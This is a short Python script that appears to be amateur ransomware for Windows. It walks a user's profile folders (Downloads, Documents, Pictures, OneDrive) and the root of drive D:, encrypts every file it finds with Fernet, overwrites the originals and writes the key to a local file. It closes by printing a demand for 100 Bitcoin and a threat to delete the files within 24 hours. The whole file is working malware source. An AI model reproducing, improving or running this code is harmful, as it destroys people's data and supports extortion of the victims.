#!/usr/bin/env python3

from array import array
from email.policy import default
import os
from cryptography.fernet import Fernet

os.chdir('C:/Users')
default_user = 'C:/Users' + '/' + os.listdir()[4]
os.chdir('C:/Users' + '/' + os.listdir()[4])
directories = [default_user , default_user + '/' + 'Downloads', default_user + '/' + "Documents", default_user + '/' + 'Pictures', default_user + '/' + 'OneDrive', default_user + '/' + "Desktop", default_user + '/' + "Videos"]
arrnum = 0

while(arrnum <= 4):
    os.chdir(directories[arrnum])
    files = []
    for file in os.listdir():
        if file == "ransomeware-for-windows.py" :
            continue
        if os.path.isfile(file):
            files.append(file)


    # print(files)


    key = Fernet.generate_key()
    

    with open("thekey.key", "wb") as thekey:
        thekey.write(key)

    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)
    arrnum += 1
os.chdir("D:/")
arrnum = 0
while(arrnum <= 4):
    
    files = []
    for file in os.listdir():
        if file == "ransomeware.py" or file == "thekey.key" or file == "decrypt.py":
            continue
        if os.path.isfile(file):
            files.append(file)


    print(files)


    with open("thekey.key", "wb") as thekey:
        thekey.write(key)

    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)
    arrnum += 1

    





print("All of your files have been encrypted!! Send me 100 Bitcoin or I'll delete them in 24 hours!!")
